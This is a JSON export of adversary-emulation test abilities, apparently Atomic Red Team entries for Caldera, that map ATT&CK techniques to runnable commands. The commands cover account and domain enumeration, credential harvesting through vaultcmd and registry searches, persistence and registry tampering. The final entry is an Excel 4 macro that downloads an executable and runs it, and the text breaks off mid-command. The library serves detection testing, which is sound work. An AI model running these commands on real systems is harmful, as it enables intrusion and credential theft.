https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "196263c4c1f42138866d958193ad2ad4", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Linked Policies In ADSISearcher Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n", "repeatable": false, "privilege": "", "buckets": ["reconnaissance"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Gather Victim Host Information: Hardware", "ability_id": "53861bc51eb67cb9775c95b9e02ad141", "technique_id": "T1592.001", "tactic": "reconnaissance", "requirements": [], "name": "Enumerate PlugNPlay Camera", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "613dc87cebac339d20973268e0bb1c0b", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Root Domain linked policies Discovery", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "f5dd56d901db9f95668988426326bc3a", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Users Not Requiring Pre Auth (ASRepRoast)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user /domain && net group /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "ee41528024c63881b53302e996a79020", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate all accounts (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate all accounts by copying /etc/passwd to another file\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1087.001.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "8acfd16975bca1d9a7d03473196f38b5", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate all accounts (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user && dir c:\\Users\\ && cmdkey.exe /list && net localgroup \"Users\" && net localgroup", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "6334877e8e3ba48f7835d4856d90a282", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate all accounts on Windows (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user /domain; get-localgroupmember -group Users; get-aduser -filter *", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "4712f45e41760276d20885bbc885a2ef", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate all accounts via PowerShell (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "e528524d6a3cddaaddc89fcc719e2a3f", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate all accounts via PowerShell (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vaultcmd /listcreds:\"Web Credentials\" /all", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "f5606cc7632289d5ca72d4a485c14f6b", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "vaultcmd /listcreds:\"Windows Credentials\" /all", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores", "ability_id": "6bbb6f8b1db42e2c2c79892e8c31feb3", "technique_id": "T1555", "tactic": "credential-access", "requirements": [], "name": "Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials]", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "681fd384d66be9e180a74e5fecdc4ab6", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Enumerate domain computers within Active Directory using DirectorySearcher", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "query user /SERVER:%COMPUTERNAME%", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "d3305a715918c2d6b60c42e9071247b1", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate logged on users via CMD (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "query user", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "8f85d74c3e78c652a9162dcf1296b404", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate logged on users via CMD (Local)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize groups and id to enumerate users and groups\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "groups; id", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "groups; id", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "26d3702887944abcc64b406baf8f8e43", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate users and groups", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize local utilities to enumerate users and groups\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dscl . list /Groups; dscl . list /Users; dscl . list /Users | grep -v '_'; dscacheutil -q group; dscacheutil -q user", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Local Account", "ability_id": "68a0a328719faa26fff5b92e18108b3f", "technique_id": "T1087.001", "tactic": "discovery", "requirements": [], "name": "Enumerate users and groups", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word \"password\" will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query HKLM /f password /t REG_SZ /s && reg query HKCU /f password /t REG_SZ /s", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials in Registry", "ability_id": "3e5b04b8ee0a1a4950da8f35d95e65fc", "technique_id": "T1552.002", "tactic": "credential-access", "requirements": [], "name": "Enumeration for Credentials in Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry\nentries are found, they will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /t REG_SZ /s", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Credentials in Registry", "ability_id": "262666862164b89881f6b5c565c0a3be", "technique_id": "T1552.002", "tactic": "credential-access", "requirements": [], "name": "Enumeration for PuTTY Credentials in Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["unset ART"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'; echo $ART |/bin/bash", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "dbe8b7090136539f0b6dea3c802024f5", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Environment variable scripts", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "env", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "env", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "278255b5ed85eebe3eab6c0a3d3d135b", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Environment variables discovery on macos and linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "set", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "System Information Discovery", "ability_id": "b5b9bf30b09bf2f3367effa3022e7aa7", "technique_id": "T1082", "tactic": "discovery", "requirements": [], "name": "Environment variables discovery on windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test adds persistence via a plist to execute via the macOS Event Monitor Daemon. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo rm /etc/emond.d/rules/atomicredteam_T1543_001.plist; sudo rm /private/var/db/emondClients/randomflag"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo cp; sudo touch /private/var/db/emondClients/#{empty_file}", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Launch Agent", "ability_id": "6df7f4008df545053790a890dd68e27c", "technique_id": "T1543.001", "tactic": "multiple", "requirements": [], "name": "Event Monitor Daemon Persistence", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"C:\\windows\\system32\\notepad.exe\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "9a413f933aa7381d0e1f3f89001f6717", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Event Viewer Registry Modification - Redirection Program", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"http://go.microsoft.com/fwlink/events.asp\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"file://C:\\windows\\system32\\notepad.exe\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "838f5d289636e22c8aa2b36d8462622a", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Event Viewer Registry Modification - Redirection URL", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This atomic test will display details about the password policy for the current AWS account.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "aws iam get-account-password-policy", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "159b2830fb32d9c87cd3abed764fcdf4", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine AWS Password Policy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the domain password policy to console on Windows.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net accounts /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "38f6f0e50a6b196140ec40d3dc9cc9e6", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine domain password policy - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the local password policy to console on Windows.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net accounts", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "57296a2ddbeb7423c05feef2fe972111", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine local password policy - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then : ; else echo Please run from CentOS or RHEL v6; fi;  ;  cat /etc/pam.d/system-auth; cat /etc/security/pwquality.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "fc5dd23fbe8b66fdfc6501a601ba9b86", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine password complexity policy - CentOS/RHEL 6.x", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then : ; else echo Please run from CentOS or RHEL v7; fi;  ;  cat /etc/security/pwquality.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "a700a94fea368d729fc80dee172fb09a", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine password complexity policy - CentOS/RHEL 7.x", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the password complexity policy to console on Ubuntu Linux.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/pam.d/common-password", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "5fdbb087d71613a73117423ef56c68ab", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine password complexity policy - Ubuntu", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "cat /etc/login.defs", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "b1ddc060c050bb98d81abf4070818a10", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine password expiration policy - All Linux", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Lists the password policy to console on macOS.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "pwpolicy getaccountpolicies", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "16481dec717301784f90d52477f685a2", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Examine password policy - macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a \"malicious\"\nVBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.\n\nA note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If\nyou'd like to utilize the \"=GET.WORKSPACE(26)\" method, that many maldoc authors use, you will need to ensure that the User Name associated\nwith Excel matches that of the local system. This username can be found under Files -> Options -> Username\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Stop-Process -Name \"procexp*\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\" -ErrorAction Ignore; Remove-Item \"$env:TEMP\\procexp.exe\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$fname = \"$env:TEMP\\atomic_redteam_x4m_exec.vbs\"; $fname1 = \"$env:TEMP\\procexp.exe\"; if (Test-Path $fname) {;   Remove-Item $fname;   Remove-Item $fname1; }; $xlApp = New-Object -COMObject \"Excel.Application\"; $xlApp.Visible = $True; $xlApp.DisplayAlerts = $False; $xlBook = $xlApp.Workbooks.Add(); $sheet = $xlBook.Excel4MacroSheets.Add(); if (\"$env:Username\" -ne \"\") {;   $sheet.Cells.Item(1,1) = \"$env:Username\"; } else {;   $sheet.Cells.Item(1,1) = \"=GET.WORKSPACE(26)\"; }; $sheet.Cells.Item(2,1) = \"procexp.exe\"; $sheet.Cells.Item(3,1) = \"atomic_redteam_x4m_exec.vbs\"; $sheet.Cells.Item(4,1) = \"=IF(ISNUMBER(SEARCH(`\"64`\",GET.WORKSPACE(1))), GOTO(A5),)\"; $sheet.Cells.Item(5,1) = \"=FOPEN(`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\", 3)\"; $sheet.Cells.Item(6,1) = \"=FWRITELN(A5, `\"url = `\"`\"https://live.sysinternals.com/procexp.exe`\"`\"`\")\"; $sheet.Cells.Item(7,1) = \"=FWRITELN(A5, `\"`\")\"; $sheet.Cells.Item(8,1) = \"=FWRITELN(A5, `\"Set winHttp = CreateObject(`\"`\"WinHTTP.WinHTTPrequest.5.1`\"`\")`\")\"; $sheet.Cells.Item(9,1) = \"=FWRITELN(A5, `\"winHttp.Open `\"`\"GET`\"`\", url, False`\")\"; $sheet.Cells.Item(10,1) = \"=FWRITELN(A5, `\"winHttp.Send`\")\"; $sheet.Cells.Item(11,1) = \"=FWRITELN(A5, `\"If winHttp.Status = 200 Then`\")\"; $sheet.Cells.Item(12,1) = \"=FWRITELN(A5, `\"Set oStream = CreateObject(`\"`\"ADODB.Stream`\"`\")`\")\"; $sheet.Cells.Item(13,1) = \"=FWRITELN(A5, `\"oStream.Open`\")\"; $sheet.Cells.Item(14,1) = \"=FWRITELN(A5, `\"oStream.Type = 1`\")\"; $sheet.Cells.Item(15,1) = \"=FWRITELN(A5, `\"oStream.Write winHttp.responseBody`\")\"; $sheet.Cells.Item(16,1) = \"=FWRITELN(A5, `\"oStream.SaveToFile `\"`\"C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A2&`\"`\"`\", 2`\")\"; $sheet.Cells.Item(17,1) = \"=FWRITELN(A5, `\"oStream.Close`\")\"; $sheet.Cells.Item(18,1) = \"=FWRITELN(A5, `\"End If`\")\"; $sheet.Cells.Item(19,1) = \"=FCLOSE(A5)\"; $sheet.Cells.Item(20,1) = \"=EXEC(`\"explorer.exe C:\\Users\\`\"&A1&`\"\\AppData\\Local\\Temp\\`\"&A3&`\"`\")\"; $sheet.Cells.Item(21,1) = 